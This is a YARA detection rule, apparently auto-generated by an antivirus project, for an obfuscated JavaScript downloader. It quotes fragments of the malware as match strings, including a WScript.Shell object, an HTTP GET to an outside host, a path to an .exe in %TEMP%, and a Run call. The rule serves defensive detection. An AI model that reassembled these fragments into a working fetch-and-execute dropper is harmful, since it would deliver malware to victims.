rule sig_20160328_1c27781efe382e934f1a4879b1ea4b93 {
  meta:
    description = "datamaliciousorder - file 20160328_1c27781efe382e934f1a4879b1ea4b93.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "de9e42e9089bdc441826b43fb2833453d42180a756d6c4ed2bf733578d75ce55"

  strings:
    $s1  = "function Pntfre() {return Bvfujjeyx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PV0uosXYo.exe\";};" fullword ascii
    $s2  = "Oaxvmd[Nmxmtxjayx](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Pfwoabc](Frhli() * 11)} while (Oaxvmd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Vwhhaglz(Hkebr, Xjbxaqkh){return Hkebr - Xjbxaqkh;};" fullword ascii
    $s5  = "var Bvfujjeyx = function Eusmfntylg() {return WScript[Thyabqtbr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nfambhjl() {return ((Ettmpbekw == true) && (Ettmpbekw == Qtfqjpqsa)) ? 1 : Agismub;};" fullword ascii
    $s7  = "function Gaunh(Ldeloa){Bvfujjeyx[\"Run\"](Ldeloa, Agismub, Agismub);};" fullword ascii
    $s8  = "Ettmpbekw = true; " fullword ascii
    $s9  = "var Ettmpbekw = false;" fullword ascii
    $s10 = "var Fvvmfsgmn = new this[\"Date\"]();" fullword ascii
    $s11 = "var Kxfkitd = false;" fullword ascii
    $s12 = "var Qtfqjpqsa = false;" fullword ascii
    $s13 = "function Foklsxyi(){return Bhwsfypv;};" fullword ascii
    $s14 = " while (Scbrwoiko){" fullword ascii
    $s15 = "function Frhli(){return 22;};" fullword ascii
    $s16 = "function Dvqvhqj(Sdufyleeu) {var Cjkcrzpr = (1, 2, 3, 4, 5, Sdufyleeu); return Cjkcrzpr;};" fullword ascii
    $s17 = "function Hpeazpo()" fullword ascii
    $s18 = "return Vwhhaglz(Gskkaze, Baqdhzxkz);" fullword ascii
    $s19 = "Qtfqjpqsa = true; " fullword ascii
    $s20 = "function Agelyypez(){return Thyabqtbr;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}